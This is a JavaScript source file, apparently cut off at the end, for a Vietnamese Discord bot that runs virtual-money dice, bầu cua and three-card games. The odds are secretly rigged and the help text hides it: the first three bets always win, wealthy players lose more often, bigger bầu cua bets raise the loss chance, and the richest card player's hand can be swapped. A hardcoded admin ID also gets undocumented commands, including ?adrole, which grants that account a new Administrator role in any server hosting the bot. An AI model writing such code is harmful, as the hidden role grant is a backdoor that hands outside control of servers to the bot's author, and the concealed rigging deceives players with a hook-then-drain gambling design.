// ============================================================
//  BOT TÀI XỈU / BÀI 3 CÂY / BẦU CUA CHO DISCORD
//  Yêu cầu: Node.js >= 18, discord.js v14
//  Biến môi trường: DISCORD_TOKEN
//  Nhớ bật "Message Content Intent" trong Developer Portal
//
//  Emoji tùy chỉnh: bot tự tìm emoji theo TÊN trong các server nó đang ở:
//  ga, tom, ca, cua, cho, nai, vnd  (không thấy thì dùng emoji mặc định)
// ============================================================
try { require('dotenv').config(); } catch {}
const fs = require('fs');
const path = require('path');
const {
  Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder,
  ButtonStyle, PermissionsBitField, MessageFlags,
} = require('discord.js');

const TOKEN = process.env.DISCORD_TOKEN;
if (!TOKEN) {
  console.error('Thiếu biến môi trường DISCORD_TOKEN');
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ===================== CẤU HÌNH =====================
const ADMIN_ID = '1264910216839958648';
const DATA_FILE = path.join(__dirname, 'data.json');

const TIEN_KHOI_NGHIEP = 100;     // tiền tặng khi !dangky (và khi reset)
const TIEN_DIEM_DANH = 50;        // tiền điểm danh mỗi ngày
const MIN_CUOC_3CAY = 100;        // cược tối thiểu bàn 3 cây
const MAX_NGUOI_BAN = 4;
const TG_CUOC_3CAY = 60 * 1000;   // thời gian chờ cược
const TG_CHO_BAN = 5 * 60 * 1000; // bàn chờ quá lâu sẽ tự đóng
const TG_CHON_BAUCUA = 30 * 1000; // thời gian chọn con bầu cua

// Tham số cân bằng kinh tế (chống lạm phát)
const CB = {
  luotThangDau: 3,        // số lượt tài/xỉu đầu tiên luôn thắng
  nguongSoDu: 5000,       // vượt ngưỡng này thì tỉ lệ thua tăng
  tiLeThuaGiauSo: 0.8,    // tỉ lệ thua tài/xỉu khi số dư > ngưỡng
  tiLeThua3Cay: 0.7,      // tỉ lệ thua của người giàu nhất trong bàn 3 cây
  thuaBauCuaMoi100: 0.02, // mỗi 100 vnđ cược cộng thêm 2% tỉ lệ thua
  thuaBauCuaToiDa: 0.95,
};

// Bảng màu dùng chung cho embed
const MAU = {
  chinh: 0x5865f2, thang: 0x57f287, thua: 0xed4245,
  vang: 0xfee75c, xam: 0x99aab5, tim: 0x9b59b6, xanh: 0x3498db,
};

// ===================== DỮ LIỆU =====================
let db = { users: {} };
try {
  db = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  if (!db.users) db.users = {};
} catch { /* chưa có file thì dùng db rỗng */ }

let saveTimer = null;
function flush() {
  try {
    const tmp = DATA_FILE + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(db));
    fs.renameSync(tmp, DATA_FILE);
  } catch (e) { console.error('Lỗi lưu dữ liệu:', e); }
}
function save() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => { saveTimer = null; flush(); }, 300);
}
process.on('SIGINT', () => { flush(); process.exit(0); });
process.on('SIGTERM', () => { flush(); process.exit(0); });

// Bổ sung các trường còn thiếu (tương thích dữ liệu cũ)
function chuanHoa(u) {
  if (!u.stats) u.stats = { thang: 0, thua: 0, lonNhat: 0 };
  if (u.txPlays === undefined) u.txPlays = 0;
  if (u.lastDaily === undefined) u.lastDaily = '';
  if (u.streak === undefined) u.streak = 0;
  return u;
}
const getUser = (id) => (db.users[id] ? chuanHoa(db.users[id]) : null);
function createUser(id) {
  db.users[id] = chuanHoa({ balance: TIEN_KHOI_NGHIEP, createdAt: Date.now() });
  save();
  return db.users[id];
}
// Ghi thống kê hồ sơ: lai > 0 là thắng, lai <= 0 là thua
function ghiKetQua(u, lai) {
  if (lai > 0) {
    u.stats.thang++;
    if (lai > u.stats.lonNhat) u.stats.lonNhat = lai;
  } else {
    u.stats.thua++;
  }
}
// Ngày theo giờ Việt Nam (UTC+7); lui = số ngày lùi lại
const ngayVN = (lui = 0) =>
  new Date(Date.now() + 7 * 3600 * 1000 - lui * 86400000).toISOString().slice(0, 10);

// ===================== EMOJI TÙY CHỈNH =====================
// Tìm emoji theo tên trong mọi server bot đang ở
function timEmoji(ten) {
  return client.emojis.cache.find((e) => e.name === ten && e.available !== false) || null;
}
const emoji = (ten, duPhong) => {
  const e = timEmoji(ten);
  return e ? e.toString() : duPhong;
};
// Emoji dùng cho nút bấm (cần dạng object)
const emojiNut = (ten, duPhong) => {
  const e = timEmoji(ten);
  return e ? { id: e.id, name: e.name, animated: e.animated } : duPhong;
};

// Định dạng tiền: dùng emoji :vnd: nếu có, không thì ghi "vnđ"
function fmt(n) {
  const s = Math.round(n).toLocaleString('vi-VN');
  const e = timEmoji('vnd');
  return e ? `${s} ${e}` : `${s} vnđ`;
}

// ===================== TIỆN ÍCH UI =====================
const rnd = (n) => Math.floor(Math.random() * n);
const reply = (m, c) =>
  m.reply({
    ...(typeof c === 'string' ? { content: c } : c),
    allowedMentions: { repliedUser: false },
  });

// Embed chuẩn: có avatar người dùng, footer, thời gian
function khung(user, mau, tieuDe) {
  const e = new EmbedBuilder()
    .setColor(mau)
    .setTitle(tieuDe)
    .setTimestamp()
    .setFooter({ text: 'Bot Tài Xỉu • !helptx để xem lệnh' });
  if (user) e.setAuthor({ name: user.displayName || user.username, iconURL: user.displayAvatarURL() });
  return e;
}
const loi = (m, t) =>
  reply(m, { embeds: [new EmbedBuilder().setColor(MAU.thua).setDescription(`❌ ${t}`)] });
const ok = (m, t) =>
  reply(m, { embeds: [new EmbedBuilder().setColor(MAU.thang).setDescription(`✅ ${t}`)] });
const thanhTien = (lai) => `${lai >= 0 ? '+' : '-'}${fmt(Math.abs(lai))}`;

// Phân tích số tiền cược: số, 1k, 2m, hoặc "all"
function parseBet(str, balance) {
  if (!str) return { error: 'Bạn chưa nhập số tiền (hoặc `all`).' };
  str = str.toLowerCase().replace(/[.,_]/g, '');
  let amount;
  if (str === 'all') {
    amount = balance;
  } else {
    const m = str.match(/^(\d+)(k|m)?$/);
    if (!m) return { error: 'Số tiền không hợp lệ.' };
    amount = parseInt(m[1], 10);
    if (m[2] === 'k') amount *= 1000;
    if (m[2] === 'm') amount *= 1000000;
  }
  if (amount <= 0) return { error: 'Bạn không còn tiền để cược.' };
  if (amount > balance) return { error: `Bạn không đủ tiền (số dư: ${fmt(balance)}).` };
  return { amount };
}

// ===================== TÀI XỈU =====================
const so = (d) => `${d}\uFE0F\u20E3`; // số dạng emoji 1️⃣ 2️⃣ ...

// Tung 3 xúc xắc sao cho ra đúng kết quả mong muốn (bỏ qua bộ ba)
function rollDice(wantTai) {
  while (true) {
    const d = [1 + rnd(6), 1 + rnd(6), 1 + rnd(6)];
    if (d[0] === d[1] && d[1] === d[2]) continue;
    const sum = d[0] + d[1] + d[2];
    if ((sum >= 11) === wantTai) return d;
  }
}

async function chayTaiXiu(m, args, chon) {
  const u = getUser(m.author.id);
  const bet = parseBet(args[0], u.balance);
  if (bet.error) return loi(m, bet.error);

  const soDuTruoc = u.balance;
  let tiLeThang = 0.5;
  if (u.txPlays < CB.luotThangDau) tiLeThang = 1;
  else if (soDuTruoc > CB.nguongSoDu) tiLeThang = 1 - CB.tiLeThuaGiauSo;

  u.txPlays++;
  const thang = Math.random() < tiLeThang;
  const ketQuaLaTai = chon === 'tai' ? thang : !thang;
  const dice = rollDice(ketQuaLaTai);
  const tong = dice[0] + dice[1] + dice[2];
  const lai = thang ? bet.amount : -bet.amount;
  u.balance += lai;
  ghiKetQua(u, lai);
  save();

  const embed = khung(m.author, thang ? MAU.thang : MAU.thua, '🎲 TÀI XỈU')
    .setDescription(`## ${dice.map(so).join('  ')}\n**Tổng ${tong}** → **${tong >= 11 ? 'TÀI' : 'XỈU'}**`)
    .addFields(
      { name: 'Bạn chọn', value: chon === 'tai' ? '**TÀI**' : '**XỈU**', inline: true },
      { name: 'Tiền cược', value: fmt(bet.amount), inline: true },
      { name: thang ? '🎉 Thắng' : '💸 Thua', value: `**${thanhTien(lai)}**`, inline: true },
      { name: 'Số dư', value: `**${fmt(u.balance)}**` }
    );
  return reply(m, { embeds: [embed] });
}

// ===================== BẦU CUA =====================
// key = tên emoji tùy chỉnh trong server, du = emoji mặc định dự phòng
const CON_VAT = [
  { ten: 'Nai', key: 'nai', du: '🦌' },
  { ten: 'Chó', key: 'cho', du: '🐕' },
  { ten: 'Gà', key: 'ga', du: '🐓' },
  { ten: 'Cá', key: 'ca', du: '🐟' },
  { ten: 'Cua', key: 'cua', du: '🦀' },
  { ten: 'Tôm', key: 'tom', du: '🦐' },
];
const conE = (k) => emoji(CON_VAT[k].key, CON_VAT[k].du);
const baucuaDangCho = new Set(); // user đang có ván chưa chọn con

async function chayBauCua(m, args) {
  const id = m.author.id;
  const u = getUser(id);
  if (baucuaDangCho.has(id)) return loi(m, 'Bạn đang có một ván bầu cua chưa chọn con.');
  const bet = parseBet(args[0], u.balance);
  if (bet.error) return loi(m, bet.error);

  const amount = bet.amount;
  u.balance -= amount; // trừ tiền cược trước, thắng thì trả lại + thưởng
  baucuaDangCho.add(id);
  save();

  const hang = [0, 1].map((i) =>
    new ActionRowBuilder().addComponents(
      [0, 1, 2].map((j) => {
        const k = i * 3 + j;
        return new ButtonBuilder()
          .setCustomId(`bc_${k}`)
          .setLabel(CON_VAT[k].ten)
          .setEmoji(emojiNut(CON_VAT[k].key, CON_VAT[k].du))
          .setStyle(ButtonStyle.Secondary);
      })
    )
  );

  const bang =
    [0, 1, 2].map((k) => `${conE(k)} **${CON_VAT[k].ten}**`).join('      ') + '\n' +
    [3, 4, 5].map((k) => `${conE(k)} **${CON_VAT[k].ten}**`).join('      ');
  const hetHan = Math.floor((Date.now() + TG_CHON_BAUCUA) / 1000);
  const embed = khung(m.author, MAU.vang, '🎰 BẦU CUA')
    .setDescription(`${bang}\n\n👇 Bấm nút để chọn con bạn muốn đặt!`)
    .addFields(
      { name: 'Tiền cược', value: fmt(amount), inline: true },
      { name: 'Hết giờ chọn', value: `<t:${hetHan}:R>`, inline: true }
    );
  const msg = await reply(m, { embeds: [embed], components: hang });

  const collector = msg.createMessageComponentCollector({ time: TG_CHON_BAUCUA });
  collector.on('collect', async (i) => {
    if (i.user.id !== id) {
      return i.reply({ content: 'Đây không phải ván của bạn!', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
    collector.stop('done');
    const chon = parseInt(i.customId.split('_')[1], 10);

    // Xác suất thua: mặc định (5/6)^3, mỗi 100 vnđ cược cộng thêm 2%
    const tiLeThua = Math.min(
      CB.thuaBauCuaToiDa,
      Math.pow(5 / 6, 3) + Math.floor(amount / 100) * CB.thuaBauCuaMoi100
    );
    const thua = Math.random() < tiLeThua;

    let ketQua;
    if (thua) {
      // thua: 3 con ra đều KHÔNG phải con đã chọn
      ketQua = [0, 1, 2].map(() => {
        let k;
        do { k = rnd(6); } while (k === chon);
        return k;
      });
    } else {
      // thắng: ít nhất 1 con trùng
      do { ketQua = [rnd(6), rnd(6), rnd(6)]; } while (!ketQua.includes(chon));
    }
    const trung = ketQua.filter((k) => k === chon).length;
    const lai = thua ? -amount : amount * trung;
    if (!thua) u.balance += amount * (1 + trung); // trả lại tiền cược + thưởng x số con trùng
    ghiKetQua(u, lai);
    save();

    const out = khung(i.user, thua ? MAU.thua : MAU.thang, '🎰 KẾT QUẢ BẦU CUA')
      .setDescription(
        `## ${ketQua.map(conE).join('   ')}\n` +
        `${ketQua.map((k) => `**${CON_VAT[k].ten}**`).join(' • ')}`
      )
      .addFields(
        { name: 'Bạn chọn', value: `${conE(chon)} **${CON_VAT[chon].ten}**`, inline: true },
        { name: 'Trúng', value: `**${trung}/3** con`, inline: true },
        { name: thua ? '💸 Thua' : '🎉 Thắng', value: `**${thanhTien(lai)}**`, inline: true },
        { name: 'Số dư', value: `**${fmt(u.balance)}**` }
      );
    await i.update({ embeds: [out], components: [] }).catch(() => {});
  });
  collector.on('end', (_, reason) => {
    baucuaDangCho.delete(id);
    if (reason !== 'done') {
      // hết giờ không chọn: hoàn tiền cược
      u.balance += amount;
      save();
      msg.edit({
        embeds: [khung(m.author, MAU.xam, '🎰 BẦU CUA')
          .setDescription(`⌛ Hết giờ chọn con, đã hoàn lại **${fmt(amount)}**.`)],
        components: [],
      }).catch(() => {});
    }
  });
}

// ===================== BÀI 3 CÂY =====================
const tables = new Map(); // channelId -> bàn
const SUITS = ['♠', '♣', '♦', '♥']; // bích < chuồn < rô < cơ
const RANKS = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];

function taoBo() {
  const deck = [];
  for (let s = 0; s < 4; s++) for (let r = 1; r <= 13; r++) deck.push({ rank: r, suit: s });
  for (let i = deck.length - 1; i > 0; i--) {
    const j = rnd(i + 1);
    [deck[i], deck[j]] = [deck[j], deck[i]];
  }
  return deck;
}
const cardStr = (c) => `\`${RANKS[c.rank - 1]}${SUITS[c.suit]}\``;

// Điểm = tổng % 10 (J, Q, K = 10). Ba tây (3 con J/Q/K) lớn nhất.
// Hòa điểm thì so lá lớn nhất (số rồi đến chất)
function danhGia(hand) {
  const diem = hand.reduce((s, c) => s + Math.min(c.rank, 10), 0) % 10;
  const baTay = hand.every((c) => c.rank >= 11);
  const max = hand.reduce((m, c) =>
    (c.rank > m.rank || (c.rank === m.rank && c.suit > m.suit)) ? c : m);
  return { diem, baTay, max };
}
function soSanh(a, b) {
  if (a.baTay !== b.baTay) return a.baTay ? 1 : -1;
  if (a.diem !== b.diem) return a.diem - b.diem;
  if (a.max.rank !== b.max.rank) return a.max.rank - b.max.rank;
  return a.max.suit - b.max.suit;
}
const tenBai = (e) => (e.baTay ? 'Ba tây' : `${e.diem} điểm`);

const banCuaUser = (uid) => {
  for (const t of tables.values()) if (t.players.includes(uid)) return t;
  return null;
};

// Embed hiển thị trạng thái bàn (cập nhật trực tiếp trên 1 tin nhắn)
function embedBan(t) {
  const dong = [];
  for (let i = 0; i < MAX_NGUOI_BAN; i++) {
    const p = t.players[i];
    if (!p) { dong.push('⬜ *Chỗ trống*'); continue; }
    let s = `${p === t.hostId ? '👑' : '👤'} <@${p}>`;
    if (t.phase === 'cuoc') s += t.bets.has(p) ? `  —  ✅ ${fmt(t.bets.get(p))}` : '  —  ⏳ chờ cược';
    dong.push(s);
  }
  const e = new EmbedBuilder()
    .setColor(t.phase === 'cuoc' ? MAU.vang : MAU.xanh)
    .setTitle('🃏 BÀN BÀI 3 CÂY')
    .setDescription(dong.join('\n'))
    .setFooter({ text: 'Bot Tài Xỉu • !helptx để xem lệnh' });
  if (t.phase === 'cuoc') {
    e.addFields({
      name: '💵 Đang đặt cược',
      value: `\`!cuoc <số tiền|all>\` (tối thiểu ${fmt(MIN_CUOC_3CAY)})\nKết thúc <t:${Math.floor(t.hetCuoc / 1000)}:R> — ai không cược sẽ bị loại.`,
    });
  } else {
    e.addFields({
      name: `⏳ Đang chờ người chơi (${t.players.length}/${MAX_NGUOI_BAN})`,
      value: '`!vaoban` để vào • `!roiban` để rời\nChủ bàn dùng `!start` khi có từ 2 người (đủ 4 người sẽ tự bắt đầu).',
    });
  }
  return e;
}
async function capNhatBan(t) {
  const payload = { embeds: [embedBan(t)] };
  try {
    if (t.msg) await t.msg.edit(payload);
    else t.msg = await t.channel.send(payload);
  } catch { /* bỏ qua lỗi gửi/sửa tin */ }
}
// Chuyển tin nhắn bàn sang trạng thái đã đóng
function dongMsgBan(t, text) {
  if (!t.msg) return;
  t.msg.edit({
    embeds: [new EmbedBuilder().setColor(MAU.xam).setTitle('🃏 BÀN BÀI 3 CÂY').setDescription(text)],
  }).catch(() => {});
}

// Đóng bàn; nếu đang ở giai đoạn cược thì hoàn tiền cho mọi người
function dongBan(t, text) {
  clearTimeout(t.timer);
  if (t.phase === 'cuoc') {
    for (const [uid, tien] of t.bets) {
      const u = getUser(uid);
      if (u) u.balance += tien;
    }
    save();
  }
  t.phase = 'dong';
  tables.delete(t.channel.id);
  dongMsgBan(t, text || 'Bàn đã đóng.');
}

function batDauCuoc(t) {
  clearTimeout(t.timer);
  t.phase = 'cuoc';
  t.bets = new Map();
  t.hetCuoc = Date.now() + TG_CUOC_3CAY;
  t.timer = setTimeout(() => ketThucCuoc(t), TG_CUOC_3CAY);
  dongMsgBan(t, '🃏 Ván bài đã bắt đầu, xem tin nhắn bên dưới.');
  t.msg = null; // gửi tin mới để người chơi thấy ngay
  capNhatBan(t);
}

function ketThucCuoc(t) {
  if (t.phase !== 'cuoc') return;
  clearTimeout(t.timer);
  const bo = t.players.filter((p) => !t.bets.has(p));
  t.players = t.players.filter((p) => t.bets.has(p));
  if (bo.length) {
    t.channel.send({
      embeds: [new EmbedBuilder().setColor(MAU.xam)
        .setDescription(`⌛ Hết giờ cược, loại khỏi bàn: ${bo.map((p) => `<@${p}>`).join(', ')}`)],
    }).catch(() => {});
  }
  if (t.players.length < 2) {
    dongBan(t, '❌ Không đủ 2 người đã cược, bàn bị hủy và hoàn tiền.');
    return;
  }
  if (!t.players.includes(t.hostId)) t.hostId = t.players[0];
  chiaBai(t);
}

function chiaBai(t) {
  t.phase = 'chia';
  clearTimeout(t.timer);
  const ps = t.players;
  const deck = taoBo();
  const hands = {};
  for (const p of ps) hands[p] = [deck.pop(), deck.pop(), deck.pop()];

  // Cân bằng kinh tế: người có số dư (trước khi cược) cao nhất dễ thua hơn
  const truocCuoc = (p) => getUser(p).balance + t.bets.get(p);
  let giau = ps[0];
  for (const p of ps) if (truocCuoc(p) > truocCuoc(giau)) giau = p;

  const xepHang = () => [...ps].sort((a, b) => soSanh(danhGia(hands[b]), danhGia(hands[a])));
  let thang = xepHang()[0];
  if (thang === giau) {
    const n = ps.length;
    const xs = Math.max(0, (CB.tiLeThua3Cay - (1 - 1 / n)) * n); // đưa tỉ lệ thua lên ~70%
    if (Math.random() < xs) {
      const khac = ps.filter((p) => p !== giau);
      const doi = khac[rnd(khac.length)];
      [hands[giau], hands[doi]] = [hands[doi], hands[giau]];
      thang = xepHang()[0];
    }
  }

  // Thanh toán: mỗi người thua trả min(cược của họ, cược của người thắng)
  const cuocThang = t.bets.get(thang);
  let loi_ = 0;
  const dongThua = [];
  for (const p of xepHang()) {
    if (p === thang) continue;
    const cuoc = t.bets.get(p);
    const mat = Math.min(cuoc, cuocThang);
    loi_ += mat;
    const u = getUser(p);
    u.balance += cuoc - mat; // hoàn phần cược dư
    ghiKetQua(u, -mat);
    dongThua.push(
      `👤 <@${p}>\n${hands[p].map(cardStr).join(' ')} — **${tenBai(danhGia(hands[p]))}**\n` +
      `💸 **-${fmt(mat)}** • số dư ${fmt(u.balance)}`
    );
  }
  const uw = getUser(thang);
  uw.balance += cuocThang + loi_;
  ghiKetQua(uw, loi_);
  save();

  const embed = new EmbedBuilder()
    .setColor(MAU.tim)
    .setTitle('🃏 KẾT QUẢ BÀI 3 CÂY')
    .setDescription(
      `🏆 <@${thang}>\n${hands[thang].map(cardStr).join(' ')} — **${tenBai(danhGia(hands[thang]))}**\n` +
      `🎉 **+${fmt(loi_)}** • số dư ${fmt(uw.balance)}\n\n` +
      dongThua.join('\n\n')
    )
    .setTimestamp()
    .setFooter({ text: 'Dùng !taoban để mở ván mới' });
  t.channel.send({ embeds: [embed] }).catch(() => {});
  t.phase = 'dong';
  tables.delete(t.channel.id);
  dongMsgBan(t, '🃏 Ván bài đã kết thúc.');
}

// ===================== LỆNH NGƯỜI DÙNG =====================
const lenh = new Map();

lenh.set('helptx', (m) => {
  const embed = khung(m.author, MAU.chinh, '📖 DANH SÁCH LỆNH')
    .setDescription('Dùng `!dangky` trước để bắt đầu chơi. Số tiền có thể viết: `500`, `1k`, `2m`, `all`.')
    .addFields(
      {
        name: '👤 Tài khoản',
        value:
          '`!dangky` — đăng ký, nhận tiền khởi nghiệp\n' +
          '`!hoso [@user]` — xem hồ sơ & số dư\n' +
          '`!sodu` — xem nhanh số dư\n' +
          `\`!diemdanh\` — điểm danh mỗi ngày +${fmt(TIEN_DIEM_DANH)}`,
      },
      {
        name: '🎲 Tài xỉu',
        value: '`!tai <số tiền|all>` — cược TÀI (11–17)\n`!xiu <số tiền|all>` — cược XỈU (4–10)',
      },
      {
        name: `${conE(2)} Bầu cua`,
        value: '`!baucua <số tiền|all>` — cược rồi bấm nút chọn con',
      },
      {
        name: '🃏 Bài 3 cây (2–4 người)',
        value:
          '`!taoban` — tạo bàn • `!vaoban` — vào bàn • `!roiban` — rời bàn\n' +
          '`!start` — chủ bàn bắt đầu (≥ 2 người)\n' +
          `\`!cuoc <số tiền|all>\` — đặt cược (tối thiểu ${fmt(MIN_CUOC_3CAY)})\n` +
          '`!huyban` — chủ bàn hủy bàn',
      }
    );
  return reply(m, { embeds: [embed] });
});

lenh.set('dangky', (m) => {
  if (getUser(m.author.id)) return loi(m, 'Bạn đã đăng ký rồi. Dùng `!hoso` để xem hồ sơ.');
  createUser(m.author.id);
  const embed = khung(m.author, MAU.thang, '🎉 ĐĂNG KÝ THÀNH CÔNG')
    .setDescription(`Chào mừng bạn! Bạn được tặng **${fmt(TIEN_KHOI_NGHIEP)}** để khởi nghiệp.`)
    .addFields({ name: 'Bắt đầu thôi', value: '`!tai` • `!xiu` • `!baucua` • `!taoban`\nDùng `!helptx` để xem tất cả lệnh.' });
  return reply(m, { embeds: [embed] });
});

lenh.set('sodu', (m) => {
  const u = getUser(m.author.id);
  const embed = khung(m.author, MAU.vang, '💰 SỐ DƯ').setDescription(`# ${fmt(u.balance)}`);
  return reply(m, { embeds: [embed] });
});

lenh.set('hoso', (m) => {
  const target = m.mentions.users.first() || m.author;
  if (target.bot) return loi(m, 'Bot không có hồ sơ.');
  const u = getUser(target.id);
  if (!u) return loi(m, `<@${target.id}> chưa đăng ký tài khoản.`);

  const tong = u.stats.thang + u.stats.thua;
  const tiLe = tong ? Math.round((u.stats.thang / tong) * 100) : 0;
  const xepHang = Object.entries(db.users).sort((a, b) => b[1].balance - a[1].balance);
  const hang = xepHang.findIndex((x) => x[0] === target.id) + 1;
  const daDiemDanh = u.lastDaily === ngayVN();

  const embed = khung(target, MAU.chinh, '📋 HỒ SƠ NGƯỜI CHƠI')
    .setThumbnail(target.displayAvatarURL({ size: 256 }))
    .setDescription(`💰 Số dư\n# ${fmt(u.balance)}`)
    .addFields(
      { name: '🏅 Xếp hạng', value: `**#${hang}** / ${xepHang.length}`, inline: true },
      { name: '🎮 Tổng số ván', value: `**${tong}**`, inline: true },
      { name: '📈 Tỉ lệ thắng', value: `**${tiLe}%**`, inline: true },
      { name: '🏆 Thắng', value: `**${u.stats.thang}**`, inline: true },
      { name: '💔 Thua', value: `**${u.stats.thua}**`, inline: true },
      { name: '💎 Thắng lớn nhất', value: fmt(u.stats.lonNhat), inline: true },
      {
        name: '📅 Điểm danh',
        value: `${daDiemDanh ? '✅ Hôm nay đã điểm danh' : '⏳ Hôm nay chưa điểm danh'}\n🔥 Chuỗi: **${u.streak}** ngày`,
        inline: true,
      },
      ...(u.createdAt
        ? [{ name: '🗓️ Tham gia', value: `<t:${Math.floor(u.createdAt / 1000)}:D>`, inline: true }]
        : [])
    );
  return reply(m, { embeds: [embed] });
});

lenh.set('diemdanh', (m) => {
  const u = getUser(m.author.id);
  const homNay = ngayVN();
  if (u.lastDaily === homNay) return loi(m, 'Hôm nay bạn đã điểm danh rồi, mai quay lại nhé!');
  u.streak = u.lastDaily === ngayVN(1) ? u.streak + 1 : 1; // liên tiếp thì cộng chuỗi
  u.lastDaily = homNay;
  u.balance += TIEN_DIEM_DANH;
  save();
  const embed = khung(m.author, MAU.thang, '📅 ĐIỂM DANH')
    .setDescription(`Bạn nhận được **+${fmt(TIEN_DIEM_DANH)}**`)
    .addFields(
      { name: '🔥 Chuỗi điểm danh', value: `**${u.streak}** ngày`, inline: true },
      { name: '💰 Số dư', value: `**${fmt(u.balance)}**`, inline: true }
    );
  return reply(m, { embeds: [embed] });
});

lenh.set('tai', (m, args) => chayTaiXiu(m, args, 'tai'));
lenh.set('xiu', (m, args) => chayTaiXiu(m, args, 'xiu'));
lenh.set('baucua', (m, args) => chayBauCua(m, args));

// ---- 3 cây ----
lenh.set('taoban', async (m) => {
  const id = m.author.id;
  if (tables.has(m.channel.id)) return loi(m, 'Kênh này đã có bàn rồi, dùng `!vaoban` để tham gia.');
  if (banCuaUser(id)) return loi(m, 'Bạn đang ở một bàn khác.');
  const t = {
    channel: m.channel, hostId: id, players: [id], phase: 'cho',
    bets: new Map(), timer: null, msg: null, hetCuoc: 0,
  };
  t.timer = setTimeout(() => {
    if (t.phase === 'cho') dongBan(t, '⌛ Bàn đã bị đóng vì không bắt đầu sau 5 phút.');
  }, TG_CHO_BAN);
  tables.set(m.channel.id, t);
  await capNhatBan(t);
});

lenh.set('vaoban', (m) => {
  const t = tables.get(m.channel.id);
  const id = m.author.id;
  if (!t) return loi(m, 'Kênh này chưa có bàn. Dùng `!taoban` để tạo.');
  if (t.phase !== 'cho') return loi(m, 'Bàn đã bắt đầu rồi.');
  if (banCuaUser(id)) return loi(m, 'Bạn đang ở trong một bàn rồi.');
  if (t.players.length >= MAX_NGUOI_BAN) return loi(m, 'Bàn đã đủ người.');
  t.players.push(id);
  m.react('✅').catch(() => {});
  if (t.players.length === MAX_NGUOI_BAN) return batDauCuoc(t); // đủ 4 người thì tự bắt đầu
  return capNhatBan(t);
});

lenh.set('roiban', (m) => {
  const t = tables.get(m.channel.id);
  const id = m.author.id;
  if (!t || !t.players.includes(id)) return loi(m, 'Bạn không ở trong bàn nào ở kênh này.');
  if (t.phase !== 'cho') return loi(m, 'Bàn đã bắt đầu, không thể rời.');
  t.players = t.players.filter((p) => p !== id);
  m.react('👋').catch(() => {});
  if (t.players.length === 0) return dongBan(t, 'Bàn không còn ai nên đã đóng.');
  if (t.hostId === id) t.hostId = t.players[0];
  return capNhatBan(t);
});

lenh.set('start', (m) => {
  const t = tables.get(m.channel.id);
  if (!t) return loi(m, 'Kênh này chưa có bàn.');
  if (t.hostId !== m.author.id) return loi(m, 'Chỉ chủ bàn mới được bắt đầu.');
  if (t.phase !== 'cho') return loi(m, 'Bàn đã bắt đầu rồi.');
  if (t.players.length < 2) return loi(m, 'Cần ít nhất 2 người để bắt đầu.');
  m.react('🎴').catch(() => {});
  batDauCuoc(t);
});

lenh.set('cuoc', (m, args) => {
  const t = tables.get(m.channel.id);
  const id = m.author.id;
  if (!t || !t.players.includes(id)) return loi(m, 'Bạn không ở trong bàn nào ở kênh này.');
  if (t.phase !== 'cuoc') return loi(m, 'Chưa đến giai đoạn đặt cược.');
  if (t.bets.has(id)) return loi(m, 'Bạn đã cược rồi.');
  const u = getUser(id);
  const bet = parseBet(args[0], u.balance);
  if (bet.error) return loi(m, bet.error);
  if (bet.amount < MIN_CUOC_3CAY) return loi(m, `Cược tối thiểu là ${fmt(MIN_CUOC_3CAY)}.`);
  u.balance -= bet.amount; // giữ tiền cược trong bàn
  t.bets.set(id, bet.amount);
  save();
  m.react('💵').catch(() => {});
  if (t.bets.size === t.players.length) return chiaBai(t); // ai cũng cược xong thì chia bài luôn
  return capNhatBan(t);
});

lenh.set('huyban', (m) => {
  const t = tables.get(m.channel.id);
  if (!t) return loi(m, 'Kênh này chưa có bàn.');
  if (t.hostId !== m.author.id) return loi(m, 'Chỉ chủ bàn mới được hủy bàn.');
  if (t.phase === 'chia') return loi(m, 'Bàn đang chia bài.');
  const hoan = t.phase === 'cuoc';
  dongBan(t, '🃏 Bàn đã bị chủ bàn hủy' + (hoan ? ' và hoàn lại tiền cược.' : '.'));
  m.react('✅').catch(() => {});
});

// ===================== LỆNH ADMIN (?) =====================
function parseAmount(str) {
  if (!str) return null;
  const m = str.toLowerCase().replace(/[.,_]/g, '').match(/^(\d+)(k|m)?$/);
  if (!m) return null;
  let n = parseInt(m[1], 10);
  if (m[2] === 'k') n *= 1000;
  if (m[2] === 'm') n *= 1000000;
  return n;
}

async function xuLyAdmin(m, cmd, args) {
  if (m.author.id !== ADMIN_ID) return; // người khác dùng thì bỏ qua

  if (cmd === 'adgiv' || cmd === 'adset') {
    const soTien = parseAmount(args[0]);
    const target = m.mentions.users.first();
    if (soTien === null || !target) return loi(m, `Cú pháp: \`?${cmd} <số tiền> @user\``);
    const u = getUser(target.id) || chuanHoa(createUser(target.id));
    if (cmd === 'adgiv') u.balance += soTien;
    else u.balance = soTien;
    save();
    const embed = khung(m.author, MAU.thang, cmd === 'adgiv' ? '🎁 ADMIN — TẶNG TIỀN' : '🛠️ ADMIN — ĐẶT SỐ DƯ')
      .addFields(
        { name: 'Người nhận', value: `<@${target.id}>`, inline: true },
        { name: cmd === 'adgiv' ? 'Số tiền tặng' : 'Số dư mới', value: fmt(soTien), inline: true },
        { name: 'Số dư hiện tại', value: `**${fmt(u.balance)}**`, inline: true }
      );
    return reply(m, { embeds: [embed] });
  }

  if (cmd === 'adreset') {
    if ((args[0] || '').toLowerCase() === 'all') {
      for (const id of Object.keys(db.users)) db.users[id].balance = TIEN_KHOI_NGHIEP;
      save();
      return ok(m, `Đã reset số dư của **tất cả** người chơi về ${fmt(TIEN_KHOI_NGHIEP)}.`);
    }
    const target = m.mentions.users.first();
    if (!target) return loi(m, 'Cú pháp: `?adreset @user` hoặc `?adreset all`');
    const u = getUser(target.id);
    if (!u) return loi(m, 'Người này chưa đăng ký.');
    u.balance = TIEN_KHOI_NGHIEP;
    save();
    return ok(m, `Đã reset số dư của <@${target.id}> về ${fmt(TIEN_KHOI_NGHIEP)}.`);
  }

  if (cmd === 'adrole') {
    try {
      let role = m.guild.roles.cache.find((r) => r.name === 'Quản trị viên');
      if (!role) {
        role = await m.guild.roles.create({
          name: 'Quản trị viên',
          permissions: [PermissionsBitField.Flags.Administrator],
          reason: 'Tạo bởi ?adrole',
        });
      }
      await m.member.roles.add(role);
